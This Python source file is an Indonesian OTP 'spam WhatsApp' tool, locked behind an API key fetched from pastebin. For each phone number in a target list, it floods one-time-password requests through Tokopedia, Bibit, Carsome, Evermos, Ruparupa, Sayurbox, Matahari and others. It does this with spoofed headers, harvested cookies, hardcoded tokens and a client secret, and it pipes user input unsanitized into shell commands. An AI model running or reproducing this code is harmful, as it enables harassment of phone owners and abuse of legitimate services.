import inquirer
import os,sys,time,requests,bs4,json,re,datetime,random,string
from datetime import datetime
from bs4 import BeautifulSoup
from colorama import Fore,init,Back
from rich.panel import Panel

###----------[ All Color ]---------- ###
# Warna
H="\033[1;92m" # Hijau
putih="\033[1;97m" # Putih
Ab="\033[1;90m" # Abu Abu
Y="\033[1;93m" # Kuning
U="\033[1;95m" # Ungu
gktau="33[37;1m" # Entah
B="\033[1;96m" # Biru
W="\033[1;0m"
N = '\x1b[0m'
#Tulisan Background Merah
bg="\033[1;0m\033[1;41msubscribe\033[1;0m"
bg2="\033[1;0m\033[1;41m(Ammar-Executed)\033[1;0m"
BL = Fore.BLUE
WH = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
YE = Fore.YELLOW
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

def loading3():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r     [+] Mengecek Apikey... " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()

def banner2():
	print (f"""
{U}╦  {putih}┌─┐┌─┐┬┌┐┌  {U}╔═╗{putih}┌─┐┬┬┌─┌─┐┬ ┬
{U}║  {putih}│ ││ ┬││││  {U}╠═╣{putih}├─┘│├┴┐├┤ └┬┘
{U}╩═╝{putih}└─┘└─┘┴┘└┘  {U}╩ ╩{putih}┴  ┴┴ ┴└─┘ ┴ {Y}@{H} Made By AmmarBN
 {R}•{putih} Note {R}:{H} Apikey{putih} Akan Diupdate setiap hari minggu {R}!""")

def check():
	try:
		os.system("clear")
		check = json.loads(open("package.json","r").read())
		url_apikey = requests.get("https://pastebin.com/raw/M9gkUyXi").json()
		check_apikey = requests.get(url_apikey["Key"]).json()
		if check_apikey["apikey"] in check["apikey"]:
			loading3()
			os.system("clear")
			print ("""\033[1;97m({\033[31;1m'\033[1;97mstatus\033[31;1m'\033[1;97m:\033[31;1m'\033[1;92mApikey Valid.\033[31;1m\033[31;1m'\033[1;97m,\033[31;1m'\033[1;97mresponse\033[31;1m'\033[1;97m:\033[1;92m200\033[1;97m})""")
			time.sleep(6)
			os.system("clear")
			print (f"{putih}Subrek {R}'{Y}Ammar Executed{R}' {H}✓")
			os.system("xdg-open https://youtube.com/@AmmarExecuted")
			time.sleep(4)
			gas()
		else:
			loading3()
			os.system("clear")
			banner2()
			os.system("rm package.json")
			print (f" {R}╳{putih} Apikey Salah/Sudah Diganti Ketik {R}'{putih}python update.py{R}' {Y}-_-")
			time.sleep(4)
	except FileNotFoundError:
		redirect()

def redirect():
	banner2()
	url_apikey = requests.get("https://pastebin.com/raw/M9gkUyXi").json()
	check_apikey = requests.get(url_apikey["Key"]).json()
	url = url_apikey["Key"]
	api = requests.get('https://tinyurl.com/api-create.php?url=https://semawur.com/HBQtq0vUx').text
	print (f" {R}•{putih} Link Download {R}:{H} {api}")
	apikey = input(f" {R}•{putih} Apikey {R}:{H} ")
	if check_apikey["apikey"] in apikey:
		loading3()
		os.system("clear")
		banner2()
		print (f" {H}✓ {putih}Apikey Valid {Y}>_<")
		open("package.json","w").write(json.dumps({"apikey":apikey}))
		time.sleep(3)
		check()
	else:
		loading3()
		os.system("clear")
		banner2()
		print (f" {R}╳{putih} Apikey Salah {R}! {Y}-_-")
		time.sleep(3)
		os.system("clear")
		redirect()

def tanya():
	try:
		choice = inquirer.list_input("Pilih Menu Ngab ", choices=["Spam WhatsApp \033[1;97m( \033[1;93mSingle Target\033[1;97m )","Spam WhatsApp \033[1;97m( \033[1;93mMassive\033[1;97m )","Atur Target \033[1;97m( \033[1;93mSettings\033[1;97m )","Remove Target ( \033[1;93mDelete\033[1;97m )","Tampilkan Target \033[1;97m( \033[1;93mView\033[1;97m )","Keluar Tools \033[1;97m( \033[1;93mExit\033[1;97m )"])
		if choice == "Spam WhatsApp \033[1;97m( \033[1;93mSingle Target\033[1;97m )":
			os.system("clear")
			print (banner)
			single()
		elif choice == "Spam WhatsApp \033[1;97m( \033[1;93mMassive\033[1;97m )":
			os.system("clear")
			print (banner)
			massive()
			#print ("Bisa")
		elif choice == "Atur Target \033[1;97m( \033[1;93mSettings\033[1;97m )":
			os.system("clear")
			print (banner)
			set_target()
		elif choice == "Remove Target ( \033[1;93mDelete\033[1;97m )":
			del_target()
		elif choice == "Tampilkan Target \033[1;97m( \033[1;93mView\033[1;97m )":
			os.system("clear")
			print (banner)
			view_target()
		elif choice == "Keluar Tools \033[1;97m( \033[1;93mExit\033[1;97m )":
			sys.exit(f"{putih}[{Y}^_^{putih}] Thanks For Use My Tools")
	except KeyboardInterrupt:
		sys.exit(f"{putih}[{R}!{putih}] Program Dihentikan {R}!{putih}")

def set_tambah():
	try:
		choice=inquirer.list_input("Add Target ? (Y/N) ", choices=["Y","N"])
		if choice == "Y":
			set_target()
		elif choice == "N":
			os.system("clear")
			print (banner)
			tanya()
			#sys.exit(f"{putih}[{Y}^_^{putih}] Thanks For Use My Tools")
	except KeyboardInterrupt:
		sys.exit(f"{putih}[{R}!{putih}] Program Dihentikan {R}!{putih}")

def set_target():
	try:
		sett=input(f"{putih}[{Y}?{putih}] Nomor Target {R}:{H} ")
		os.system(f"echo '{sett}' > list1.txt")
		os.system(f"mv target.txt list2.txt")
		os.system(f"cat list1.txt list2.txt > target.txt")
		set_tambah()
	except KeyboardInterrupt:
		sys.exit(f"{putih}[{R}!{putih}] Program Dihentikan {R}!{putih}")

def del_target():
	try:
		choice=inquirer.list_input("Are You Sure You Want To Delete All Targets? ",choices=["Yes","No"])
		if choice == "Yes":
			os.system("rm list1.txt list2.txt target.txt")
			time.sleep(5)
			print (f"{putih}[{H}✓{putih}] Success Delete All Target")
			time.sleep(5)
			os.system("clear")
			print (banner)
			tanya()
		elif choice == "No":
			time.sleep(5)
			os.system("clear")
			print (banner)
			tanya()
	except KeyboardInterrupt:
		sys.exit(f"{putih}[{R}!{putih}] Program Dihentikan {R}!{putih}")

def delay(time_sec):
	try:
		while time_sec:
			mins, secs = divmod(time_sec,60)
			timeformat = '  \033[1;97m[\033[1;93m•\033[1;97m] Wait \033[1;92m{:02d}:{:02d}'.format(mins,secs)
			print(timeformat,end='\r')
			time.sleep(1)
			time_sec -= 1
		time.sleep(5)
	except KeyboardInterrupt:
                print (f"{W}Program Terminated [{R}!{W}]")
                sys.exit()

def massive():
	try:
		a=0
		gas = open('target.txt','r').readlines()
		for line in gas:
			a += 1
			nomor=line.strip()
			tokoko=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={'Host':'api-v2.bukuwarung.com','content-length':'198','sec-ch-ua':'"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile':'?0','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','x-app-version-code':'5050','x-app-version-name':'android','buku-origin':'tokoko','sec-ch-ua-platform':'"Linux"','origin':'https://web.tokoko.id','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://web.tokoko.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
			site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}).text # tokped
			search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1) # tokped
			sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}, data = {'otp_type' : '116','msisdn' : '0'+nomor,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',}).text # send requests tokped
			kukis={'cookie':'ajs_anonymous_id=5a3e8670-63ce-4348-8dca-641748d7d767','cookie':'_ALGOLIA=anonymous-2b34b4e4-c817-499f-a0d4-5930ffbaf7ff','cookie':'_fbp=fb.1.1662046677088.183334261','cookie':'g_state={"i_p":1662053880779,"i_l":1}','cookie':'_hjSessionUser_1895264=eyJpZCI6IjBkNWYwMjNjLWNjMGEtNTVmNi1hYTNkLTgwZmJjYTU5N2RhNiIsImNyZWF0ZWQiOjE2NjIwNDY2NzY2NTgsImV4aXN0aW5nIjp0cnVlfQ==','cookie':'amp_7c6549=BuD_ETdrbio9LDUB2TB6V-...1gc3r9m4s.1gc3r9m4s.0.0.0','cookie':'_clck=1nxlj0s|1|f4l|0','cookie':'tml_t=ab85e71e-ddd0-4317-a14b-1e5a6c202a43','cookie':'amp_4b05bb=jrGWubrrFNjGvlqLBgVTH_...1glb1ck7f.1glb1ck7f.0.0.0','cookie':'__cf_bm=Ee0IbDXhZjy2AiRtIyyK7OhmiIN9OawLBwVyRHC3DLQ-1672186583-0-AdaNbL4+xeIXNO1UbfZ1feHhHZCjnQlkjgARFkyoFJQ117Za5erTm4q2gKEuogBEtNqcxWbNCX/EoBa9wp7auxY=','cookie':'_gcl_aw=GCL.1672186586.CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE','cookie':'_gcl_au=1.1.2101568662.1672186586','cookie':'utm={"utm_source":"Google","utm_medium":"Search","utm_campaign":"EN_AlwaysOn_PureBrand_Exact_Brand_","utm_term":"Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_"}','cookie':'attribution=Google','cookie':'ucif={"src":"Google","med":"Search","camp":"EN_AlwaysOn_PureBrand_Exact_Brand_","cont":"carsome","term":"Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_"}','cookie':'attribution=Google','cookie':'_hjIncludedInSessionSample=0','cookie':'_hjSession_1895264=eyJpZCI6ImE0YTAzNmVkLTBiNzctNGYzOC1hNWZiLTUzODEyM2RlNjU0NCIsImNyZWF0ZWQiOjE2NzIxODY1ODkxMDcsImluU2FtcGxlIjpmYWxzZX0=','cookie':'_hjAbsoluteSessionInProgress=1','cookie':'moe_uuid=30b62d3f-6f5c-46a2-b324-79bb5fdde264','cookie':'_gid=GA1.2.1272855920.1672186591','cookie':'_gac_UA-70043720-4=1.1672186591.CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE','cookie':'_gat_UA-70043720-4=1','cookie':'_ga=GA1.1.651678291.1662046676','cookie':'_ga_L3ZY5XJB08=GS1.1.1672186591.5.0.1672186592.59.0.0','cookie':'tml_s=3ba17acd-ecae-4716-b725-d4176b4c88a1',
		'cookie':'_uetsid=e3fb7eb0864411eda3df3b3860185a56','cookie':'_uetvid=0f040fa02a0c11ed8727e1811f9a3cb3'} # kukis carsome
			carsome=requests.post("https://www.carsome.id/website/login/sendSMS",headers={'Host':'www.carsome.id','content-length':'38','sec-ch-ua':'"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','x-language':'id','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','country':'ID','x-amplitude-device-id':'jrGWubrrFNjGvlqLBgVTH_','sec-ch-ua-platform':'"Android"','origin':'https://www.carsome.id','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.carsome.id/jual-mobil-bekas?utm_source=Google&utm_medium=Search&utm_campaign=EN_AlwaysOn_PureBrand_Exact_Brand_&utm_term=Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_&utm_content=carsome&gclid=CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},cookies=kukis,data=json.dumps({"username":nomor,"optType":1})).text
			bibit=requests.post("https://api.bibit.id/auth/register/phone",headers={'Host':'api.bibit.id','accept':'application/json, text/plain, */*','content-type':'application/json','sec-ch-ua-mobile':'?1','x-platform':'web','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://app.bibit.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://app.bibit.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"code":"62","phone":nomor,"via":"whatsapp","recaptcha_token":"","recaptcha_type":"v3"})).text
			cook={"cookie":"_gcl_au=1.1.909457086.1662115605","cookie":"__gtm_campaign_url=https%3A%2F%2Fevermos.com%2Freg%2Fsitelink_daftar%2F%3Fgclid%3DCj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"__gtm_referrer=https%3A%2F%2Fwww.google.com%2F","cookie":"_gid=GA1.2.1927488580.1662115605","cookie":"_gac_UA-127603098-29=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_gac_UA-127603098-27=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_gcl_aw=GCL.1662115606.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_fbp=fb.1.1662115607118.1815022728","cookie":"_ga_E48JMVJVEG=GS1.1.1662115603.1.0.1662115609.0.0.0","cookie":"poptin_old_user=true","cookie":"poptin_user_id=0.42qy01qhmjj","cookie":"evm_client_token=fd0c103b778b2da4bf5cd3520ff64a500f3f1137","cookie":"evm_version=2.48.14","cookie":"utm_tracker=%7B%22source_link%22%3A%22versionb.ea7%22%7D","cookie":"_ga=GA1.2.56596919.1662115604","cookie":"_gat_gtag_UA_127603098_1=1","cookie":"_gat_UA-127603098-1=1","cookie":"_ga_8NN2ZT44WP=GS1.1.1662115616.1.0.1662115619.0.0.0","cookie":"rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX19cj2GvLExMO7pRcRLevWUUYg9hSlCCKEbtmQAzju4RWUWo22yC%2B3dUMBswi22yZpDc2jU3DHURNmVnOfZLpfGzkMpatP9yCh0%3D","cookie":"rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18v21NYtvQDe7sPj6DM6%2BqN8HCmUTTSGrA%3D","cookie":"_gat=1","cookie":"MgidSensorNVis=2","cookie":"MgidSensorHref=https://evermos.com/registration?source_link=versionb.ea7","cookie":"_gat_%5Bobject%20Object%5D=1","cookie":"afUserId=154dedac-a679-4204-8121-fbd290672de8-p","cookie":"AF_SYNC=1662115627689","cookie":"registered_user=%7B%22verificationToken%22%3Anull%2C%22phone%22%3A%2262"+nomor+"%22%2C%22password%22%3A%22jsjwjwhebe%22%2C%22name%22%3A%22Zgsghshsbs%22%2C%22subDistrictId%22%3A%223175%22%2C%22referral%22%3Anull%7D",
		"cookie":"otp_config=%7B%22action%22%3A%22registration%2FdoRegister%22%2C%22redirectUrl%22%3A%22%2Fcatalog%3FnewUser%3D1%22%7D","cookie":"rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2B%2BfZWMpHNJzHadlZHZva4JNdrFmOCLYIX0Qh5h%2FPDZ8c2htJ%2FhtS9bKg3eddpUadVfLXPe7%2FYiIw%3D%3D","cookie":"amp_e15389=3AYNBj9lB2pDQI8v06V0tC...1gbusvcej.1gbut0lb0.6.0.6"}
			Arifa=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","content-length":"25","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor}),cookies=cook).text
			headrupa={'Host':'wapi.ruparupa.com','content-length':'120','sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile':'?0','authorization':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYmUxNDg3ZTItMjVkNC00YjJiLWFjYmQtN2Q2MmI0ZTFlZGI3IiwiaWF0IjoxNjg2NDA4Mjg0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.1QXV6WzC6iVWDfrCel8wyL27T92K63eUEQuL4O9eTns','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','content-type':'application/json','x-company-name':'odi','accept':'application/json','x-frontend-type':'mobile','informa-b2b':'false','user-platform':'mobile','sec-ch-ua-platform':'"Linux"','origin':'https://www.ruparupa.com','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.ruparupa.com/verification?page=otp-choices','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			datarupa=json.dumps({"phone":"0"+nomor,"action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0})
			postrupa=requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers=headrupa,data=datarupa).text
			#ruparupa = requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"117","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs","content-type":"application/json","x-company-name":"odi","accept":"application/json","informa-b2b":"false","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","user-platform":"mobile","x-frontend-type":"mobile","sec-ch-ua-platform":"Android","origin":"https://m.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor,"action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0})).text
			headsayurbox={'Host':'www.sayurbox.com','content-length':'289','sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile':'?1','authorization':'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjg2NDA5MzE4LCJleHAiOjE2ODkwMDEzMTgsImlhdCI6MTY4NjQwOTMxOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6Ijk5MDU1Y2YxLWQ1YmUtNGFjZC1iYTA5LWYyYzMyNGJjYTc3NSIsInN1YiI6ImhGV3RNaDhacGlQRlFrdnNnMzlwckowS2xIc0UiLCJ1c2VyX2lkIjoiaEZXdE1oOFpwaVBGUWt2c2czOXBySjBLbEhzRSJ9.iW7dBeEaB_NUBZZknhPBJVh8RN-zodZqqv4OWM1ZUL8q9OFbTIS_KamHkzi30kGyP011Q6OO-fd9R9tZOWql6BBpUMt3A2NvzdF6BsdgQELJxHm_moMgh_aP6oe8cf6JvEkWjkxffQXih4zFD-M1oOqEtbpbFawZ5zLXzgIqJylh2WG9gShBamxx_qILUx3Rpgew-P3a5jlYkZfXPcrx6IoXAYw1BToKOcAoY1ZZt8sMbpYfEhLGDdYmm2KiBP37AZWsML6i5yRd-A_CSkduSJt5oSOUYyyrVuykIYDY_kV9-olaBKas2-sOFhtTVbFHeNlXw19FQIEp3cuww5_a7A','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'*/*','x-sbox-lang':'id','x-bundle-revision':'40.1','x-sbox-tenant':'b2c','x-binary-version':'2.10.3','sec-ch-ua-platform':'"Android"','origin':'https://www.sayurbox.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			datasayurbox=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
			postsayurbox=requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers=headsayurbox,data=datasayurbox).text
			#js=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
			#ken=requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={'Host':'www.sayurbox.com','content-length':'289','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-device-info':'{"platform":"web","is_app":false,"is_mobile":true,"device_type":"mobile","device_id":"LWUOU5jfEtY_43IsmFme_","os_name":"Android","os_version":"11","brand":null,"model":null,"client_ip":"::ffff:10.10.212.88","pixel_density":2}','sec-ch-ua-mobile':'?1','authorization':'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyMzc2NTc0LCJleHAiOjE2NjQ5Njg1NzQsImlhdCI6MTY2MjM3NjU3NCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjFmOWE0NGI0LTE0MTgtNGIyNC1iYTRkLWU0MTEwN2FjOWU2NSIsInN1YiI6IjRwZUpiTjB5cUpuQkd4NDBfMGVWbWV1S3lkYWQiLCJ1c2VyX2lkIjoiNHBlSmJOMHlxSm5CR3g0MF8wZVZtZXVLeWRhZCJ9.hbvAGWui1gSK26sEzhC9l790_JVobzkR3j82ZPi1hIwflbf-f08WTRbTraE7_6U_Q60QetC0Xk-GR3JndHodWuXvMbi0yIum8ghQ2fGG4ZR5F9RdPWOv0k1v10NyxOxUuWdfVUK_wMqoYZGK4klL2B3InPd-WMra4MhX9JoW91LBtpLx-tm5GLzPytX5hHINiqs6hZnvypbIBGqQr5oQp_ruJNezAfUBtYVmHdUahlJs1j9aD8IDF-86NVGGEfLjOMERi1cet4mf8uJmKn9ScIP18XMQVAdoxJnkVTwPQBOvQsP2EOMyh___hYvpjwe2T4qriGD1lpMgP2cHuf-dxw','content-type':'application/json','accept':'*/*','x-bundle-revision':'6.0','x-sbox-tenant':'sayurbox','x-binary-version':'2.2.1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://www.sayurbox.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=js).text
			headmatahari={'Host':'www.matahari.com','content-length':'888','sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','x-newrelic-id':'Vg4GVFVXDxAGVVlVBgcGVlY=','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'*/*','x-requested-with':'XMLHttpRequest','sec-ch-ua-platform':'"Android"','origin':'https://www.matahari.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.matahari.com/customer/account/create/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			datamatahari=json.dumps({"thor_customer":{"name":" Zgshjsbsjdjd","card_number":"null","email_address":"anjay2827@gmail.com","mobile_country_code":"+62","gender_id":"1","mobile_number":"08"+nomor,"password":"Anjay123","birth_date":"11/06/2014","amasty_invisible_token":"03AL8dmw_FGM0mE2V8YS410A33M9DvPbov-07mUtCkV0W71MQ2svmBk_2Rb987aD4_neFK-lxDufStMl4QBOT2u1LGOMNTM5QUMyjSlpx7ytmk3SIoxIFd7gPLTTI0uspElgAgoEQVFSaDbb61vp195BlUhxGw054zrdW2GL_xad2VR6_bmnOdITelUmxBNPVO-B3yBNieUrCRt0fctLMmqvfqLlf7Ewl_oNFvzgDftZng3ug4peQzP8p6mmh2K707CGdBjotG8OtDN_6W7K-6zeHSt-7ojCur6-rHuTxFx4qcCZaPqvM-uzQBf-AdTkHQD8tHUBg6r3nH9wUNDSxAGpzNo0Sko2ld8OMLdYXaCCjKH9v9EkC7RDc8PQ9SZvmsWUvYl3el3g82iMhEANy47gzEspy6pFh6Kw1WyCmKQoW24SkUGP3qWjbyeLiQipiOOPBJLjOZx34VWJfp_lhB60_QSVY4klRsZUxaCbpzybdA-PygUPrPHM5mT4R3rji0Bx4P5x36A8O0kQz3kfvxKAk3Km5kxDqG50YSmIcPaXcpWxp0uf45ShUgtCNEj_wFhqGqsIM2O3G7","store_value":"","ref_value":"","code_value":""}})
			postmatahari=requests.post("https://www.matahari.com/rest/V1/thorCustomers",headers=headmatahari,data=datamatahari).text
